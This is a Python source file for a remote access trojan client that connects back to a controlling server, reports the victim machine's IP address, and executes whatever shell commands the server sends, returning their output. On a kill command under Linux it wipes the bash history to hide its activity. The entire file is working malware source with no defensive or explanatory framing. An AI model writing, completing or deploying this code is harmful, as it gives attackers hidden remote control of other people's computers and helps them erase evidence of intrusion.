import socket, os
import subprocess
import platform

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        global server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        server.send(sending.encode())
    
    def errorsend(self, info):
        output = str(info)
        server.send(output.encode)

    def execute(self):
        while True:
            command = server.recv(1024).decode()
            if command == "hostname":
                output = subprocess.getoutput(command)
                server.send(output.encode())
                continue
            elif command == 'shell':
                while 1:
                    command = server.recv(1024).decode()
                    if command == 'back':
                        break
                    elif command.split(' ')[0] == 'cd':
                        os.chdir(command.split(' ')[1])
                        dir = os.getcwd()
                        dir1 = str(dir)
                        server.send(dir1.encode())
                    output = subprocess.getoutput(command)
                    server.send(output.encode())
            elif command == 'exit' or command.lower() == 'kill':
                if platform.system() == 'Windows':
                    server.close()
                    exit()
                elif platform.system() == 'Linux':
                    subprocess.getoutput("cat /dev/null > ~/.bash_history && history -c")
                    server.close()
                    exit()
            elif command == 'taskfile':
                while 1:
                    command = server.recv(1024).decode()
                    if command == 'exit':
                        break
                    else:
                        output = subprocess.getoutput(command)
                        server.send(output.encode())

#note ip and port are for the server
rat = RAT_CLIENT('127.0.0.1', 80)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
